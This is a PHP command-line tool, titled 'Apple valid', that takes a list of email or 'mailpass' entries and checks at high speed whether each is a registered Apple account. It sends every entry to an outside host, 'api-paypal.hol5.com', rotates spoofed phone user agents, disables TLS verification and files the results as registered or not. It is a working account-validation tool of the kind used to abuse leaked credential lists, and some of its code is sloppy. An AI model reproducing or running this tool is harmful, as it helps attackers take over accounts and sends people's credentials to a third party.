<?php
ob_implicit_flush();
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));
define("API", "http://api-paypal.hol5.com/api.php" , "http://api-paypal.hol5.com/api2.php");

echo banner();

enterlist:
$listname = readline(" Input your file list? ");
if(empty($listname) || !file_exists($listname)) {
	echo" * not found!".PHP_EOL;
	goto enterlist;
}
$lists = file_get_contents($listname);
$lists = explode("\n", str_replace("\r", "", $lists));
$lists = array_unique($lists);
$delim = readline(" delim (fill if the list type is empas)? ");
$delim = empty($delim) ? false : $delim;
$savetodir = readline(" save to dir (default: valid)? ");
$savetodir = empty($savetodir) ? "valid" : $savetodir;
if(!is_dir($savetodir)) mkdir($savetodir);
chdir($savetodir);
sendemail:
$ratio = readline(" send email per second (max: 500)? ");
$ratio = (empty($ratio) || !is_numeric($ratio) || $ratio <= 0) ? 2 : $ratio;
if($ratio > 500) {
	echo " * max 500".PHP_EOL;
	goto sendemail;
}
$delpercheck = readline(" delete list per check (y/n)? ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;
$no = 0; $total = count($lists); $registered = 0; $die = 0; $limited = 0;
$lists = array_chunk($lists, $ratio);
echo PHP_EOL;

foreach($lists as $clist) {
	$array = $ch = array();
	$mh = curl_multi_init();
	foreach($clist as $i => $list) {
		$no++;
		$email = $list;
		if(empty($email)) continue;
		$array[$i]["no"] = $no;
		$array[$i]["list"] = $list;
		$array[$i]["email"] = $email;
        $urlindexnya = array("apple1","apple2","apple3","apple4","apple5");
        $urlindexrand = rand(0,4);
		$useregen = array("Android/5.1; Bermi/1.40.1; Manufacturer/OPPO; Model/A1603; Gaoiscoolman",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202 Mobile Safari/537.36",
"Android Phone / Chrome 60 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 65 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Mobile Safari/537.36",
"Android Phone / Chrome 59 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36",
"Android Phone / Chrome 51 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36",
"Android Phone / Chrome 55 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/134.0.0.25.91;]",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36",
"Android Phone / Chrome 56 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 8.0; Nexus 6P Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.121 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; Redmi Note 5 Build/OPM1.171019.011) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; CLT-AL01 Build/HUAWEICLT-AL01) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; ONEPLUS A5010 Build/OPM1.171019.011) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Android Phone / Chrome 60 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Pixel Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.66 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; vivo X21A Build/OPM1.171019.011) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P Build/OPR5.170623.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 63 [Mobile]: Mozilla/5.0 (Linux; Android 9.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3237.0 Mobile Safari/537.36",
"Android Phone / Chrome 63 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P Build/OPR5.170623.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 9.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.0 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; SM-G965F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 8.1.99; Build/PPP2.180412.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Geck",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.81 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36",
"Android Phone / Chrome 44 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 ACHEETAHI/1",
"Android Phone / Chrome 55 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 Liebao",
"Android Phone / Orca [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/144.0.0.22.136;]",
"Android Phone / Chrome 48 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/140.0.0.43.91;]",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36 Mobile/1 EtsyInc/4.56.0 Android/1",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36",
"Android Phone / Chrome 66 [Mobile]: Mozilla/5.0 (Linux; Android 8.1; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
"Android Phone / Chrome 63 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36~Real Appeal-8.0.0",
"Android Phone / Chrome 66 [Mobile]: Mozilla/5.0 (Linux; Android 8.1; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Mobile Safari/537.36",
"Android Phone / Opera 37.8 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36 OPR/37.8.2192.106015",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 8.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64 Mobile Safari/537.36",
"Android Phone / Firefox 58 [Mobile]: Mozilla/5.0 (Linux; Android 8.0; SM-G935P Build/NRD90M) Gecko/20100101 Firefox/58.0.1",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36",
"Android Phone / Samsung Browser 5.4 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36",
"Android Phone / Samsung Browser 6.2 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36",
"Android Phone / Samsung Browser 5 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/51.0.2704.106 Mobile Safari/537.36",
"Android Phone / Samsung Browser 6.4 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Android Phone / Chrome 59 [Mobile]: Mozilla/5.0 (Linux; Android 8.1; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 8.1.99; Qualcore 1030 4G Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Safari/537.36",
"Android Phone / Chrome 66 [Mobile]: Mozilla/5.0 (Linux; Android 8.1.99; BQS_4504_Nice Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36",
"Android Phone / Chrome 64 [[Mobile]: Mozilla/5.0 (Linux; Android 8.1.99; Huawei Y301A1 Build/HuaweiY301A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Android Phone / Chrome 68 [Mobile]: Mozilla/5.0 (Linux; Android 8.1.99; Build/PPP2.180412.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3434.0 Mobile Safari/537.36",
"Android Phone / Internet Explorer [Mobile]: Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/",
"Android Phone / Chrome 66 [Mobile]: Mozilla/5. (Android 8.) AppleWebKit/538 Chrome/66",
"Android Phone / UC Browser 10.9 [Mobile]: Mozilla/5.0 (Linux; U; Android 8.0.2; en-US; REMI GAPLE V6 Build/GETUK_OS) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.0.731 U3/0.8.0 Mobile Safari/534.30",
"Android Phone / UC Browser 10.9 [Mobile]: Mozilla/5.0 (Linux; U; Android 8.0.2; en-US; Lenovo A536 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.0.731 U3/0.8.0 Mobile Safari/534.30",
"Android Phone / Firefox 62 [Mobile]: Mozilla/5.0 (Android 8.1.1; Mobile; rv:62.0) Gecko/62.0 Firefox/62.0",
"Android Phone / Chrome 68 [Mobile]: Mozilla/5.0 (Linux; Android 8.1.1; SM-J700M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.8 Mobile Safari/537.36",
"Android Phone / Chrome 66 [Mobile]: Mozilla/5.0 (Linux; Android 8.1.1; Nexus 5 Build/M4B30Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
"Android Phone / Firefox 62 [Mobile]: Mozilla/5.0 (Android 8.1.1; Mobile; rv:60.0.1) Gecko/60.0 Firefox/60.0.1",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP4.180612.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/5.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: Mozilla/5.0 (Linux; Android 12.5; Marvel Xcore7 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36",
"Android Phone / Chrome 61 [Mobile]: com.zhihu.android/Futureve/5.19.1 Mozilla/5.0 (Linux; Android 8.0.0; MHA-AL00 Build/HUAWEIMHA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36",
"Apple iPhone / Safari 11 [Mobile]: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1Android Phone / Chrome 62 [Android 7.0]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202 Mobile Safari/537.36",
"Android Phone / Chrome 60 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 65 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Mobile Safari/537.36",
"Android Phone / Chrome 59 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36",
"Android Phone / Chrome 51 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36",
"Android Phone / Chrome 55 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/134.0.0.25.91;]",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 6.0.1; SM-G935P Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36",
"Android Phone / Chrome 56 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 8.0; Nexus 6P Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.121 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; Redmi Note 5 Build/OPM1.171019.011) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; CLT-AL01 Build/HUAWEICLT-AL01) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Chrome 58 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; ONEPLUS A5010 Build/OPM1.171019.011) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Chrome 64 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Android Phone / Chrome 60 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Pixel Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.66 Mobile Safari/537.36",
"Android Phone / Android Browser [Mobile]: Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; vivo X21A Build/OPM1.171019.011) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
"Android Phone / Chrome 67 [Mobile]: Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPP3.180510.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36",
"Android Phone / Chrome 62 [Mobile]: Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P Build/OPR5.170623.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
$useregenrand = rand(0,200);
$useregengas = $useregen[$useregenrand];

		$ch[$i] = curl_init();
		curl_setopt($ch[$i], CURLOPT_URL, 'http://api-paypal.hol5.com/apple/'.$urlindexnya[$urlindexrand].'/check.php?mailpass='.$email);
		curl_setopt($ch[$i], CURLOPT_ENCODING, "");
		curl_setopt($ch[$i], CURLOPT_POST, 0);
		curl_setopt($ch[$i], CURLOPT_HEADER, 1);
		curl_setopt($ch[$i], CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch[$i], CURLOPT_COOKIESESSION, 1);
		curl_setopt($ch[$i], CURLOPT_COOKIEJAR, "cookie.txt");
		curl_setopt($ch[$i], CURLOPT_COOKIEFILE, "cookie.txt");
		curl_setopt($ch[$i], CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch[$i], CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_USERAGENT, $useregengas);
		curl_multi_add_handle($mh, $ch[$i]);
	}
	$active = null;
	do {
		curl_multi_exec($mh, $active);
	} while($active > 0);
	foreach($ch as $i => $c) {
		$no =  $array[$i]["no"];
		$list =  $array[$i]["list"];
		$email =  $array[$i]["email"];
		$respon = curl_multi_getcontent($c);
		$x = $respon;
		if($x != "") {
			if(strpos($x, "DIE")) {
				$die++;
				file_put_contents("die.txt", $list.PHP_EOL, FILE_APPEND);
				echo " [".$no."/".$total."][".date("H:i:s")."] ".$email." => ".color()["LR"]."Not Registered";
			}else if(strpos($x, "UNCHECK")) {
				$limited++;
				file_put_contents("unkown.txt", $list.PHP_EOL, FILE_APPEND);
				echo " [".$no."/".$total."][".date("H:i:s")."] ".$email." => ".color()["BR"]."Uncheck !";
			}else if(strpos($x, "LIVE")) {
				$registered++;
				file_put_contents("registered.txt", $list.PHP_EOL, FILE_APPEND);
				echo " [".$no."/".$total."][".date("H:i:s")."] ".$email." => ".color()["LG"]."Registered";
			}
		}else{
			die("Failed to connect server !");
		}
		if($delpercheck) {
    		$awal = str_replace("\r", "", file_get_contents("../".$listname));
    	   	$akhir = str_replace($list."\n", "", $awal);
    	   	if($no == $total) $akhir = str_replace($list, "", $awal);
    	    file_put_contents("../".$listname, $akhir);
    	}
		echo PHP_EOL;
		curl_multi_remove_handle($mh, $c);
		usleep(7000);
	}
	curl_multi_close($mh);
}
if(empty(file_get_contents("../".$listname))) unlink("../".$listname);
echo PHP_EOL." Total [ ".$total." ] Registered - [ ".$registered." ] Not Registered - [ ".$die." ] - Unknown [ ".$limited." ] ".PHP_EOL." saved to dir \"".$savetodir."\"".PHP_EOL;

function banner() {
	$out = color()["LW"]."---------------------------------------------------
   Apple valid - NBA Coder
---------------------------------------------------".color()["WH"].PHP_EOL;
	return $out;
}
function get_str($str, $strt, $end) {
	$str = explode($strt, $str);
	$str = explode($end, $str[1]);
	return $str[0];
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : ""),
        "BR" => (OS == "linux" ? "\e[1;44m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33;40m" : "")
	);
}
